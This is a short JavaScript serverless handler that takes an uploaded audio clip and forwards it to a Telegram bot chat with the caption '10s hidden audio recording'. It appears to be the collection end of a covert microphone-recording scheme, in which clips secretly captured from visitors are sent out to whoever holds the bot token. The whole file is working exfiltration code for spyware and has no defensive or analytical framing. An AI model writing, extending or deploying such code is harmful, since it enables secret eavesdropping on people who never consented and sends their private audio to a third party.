export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ success: false });

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  try {
    const formData = await req.formData();
    const audio = formData.get('audio');

    if (!audio) return res.status(400).json({ success: false });

    const tgForm = new FormData();
    tgForm.append("chat_id", CHAT_ID);
    tgForm.append("audio", audio, "10s_audio.webm");
    tgForm.append("caption", "10s hidden audio recording");

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
      method: "POST",
      body: tgForm
    });

    if (!tgRes.ok) throw new Error("Telegram failed");
    res.status(200).json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
}
